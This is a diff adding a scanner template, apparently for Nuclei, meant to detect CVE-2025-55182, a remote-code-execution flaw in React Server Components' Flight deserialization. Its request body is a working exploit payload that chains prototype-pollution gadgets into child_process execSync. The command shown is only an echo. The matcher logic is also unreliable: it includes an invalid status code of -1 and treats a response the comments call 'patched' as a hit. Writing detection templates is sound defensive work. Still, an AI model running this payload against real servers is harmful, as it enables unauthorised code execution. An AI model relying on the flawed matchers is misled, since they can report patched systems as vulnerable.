@@ -1,0 +1,58 @@
+id: CVE-2025-55182-detection
+
+info:
+  name: React Server Components RCE Detection (Flight Deserialization)
+  author: xai
+  severity: critical
+  description: Detects CVE-2025-55182 via crafted Flight chunk deserialization leading to potential RCE. Based on public PoC exploiting unsafe path traversal and gadget invocation.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-55182
+    - https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
+    - https://gist.github.com/HerringtonDarkholme/87f14efca45f7d38740be9f53849a89f
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cve-id: CVE-2025-55182
+  tags: cve,cve2025,react,nextjs,rce,ssrf,deserialization,flight-protocol
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Next-Action: x  # Triggers Server Action processing (arbitrary ID)
+    body: |
+      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+      Content-Disposition: form-data; name="0"
+
+      { "then" : "$1:__proto__:then" , "status" : "resolved_model" , "reason" : -1 , "value" : "{ \"then\" : \"$B1337\" }" , "_response" :{ "_prefix" : "process.mainModule.require('child_process').execSync('echo vulnerable');" , "_formData" :{ "get" : "$1:constructor:constructor" }}}
+      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+      Content-Disposition: form-data; name="1"
+
+      "$@0"
+      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - -1  # Connection timeout/hang (common on success)
+          - 504  # Gateway timeout
+      - type: word
+        words:
+          - "Invalid chunk reference"  # Deserialization failure (patched)
+          - "ReactFlightReplyServer"  # Stack trace leak
+          - "getOutlinedModel"  # Internal func from write-up
+        part: body
+        condition: and
+      - type: dsl
+        dsl:
+          - "contains(body, 'prototype') && contains(body, 'constructor')"  # Pollution traces
+        condition: and
+
+    extractors:
+      - type: regex
+        name: action_id
+        part: header
+        group: 1
+        regex:
+          - 'Next-Action: ([a-f0-9]{40})'  # Extract if present for chaining
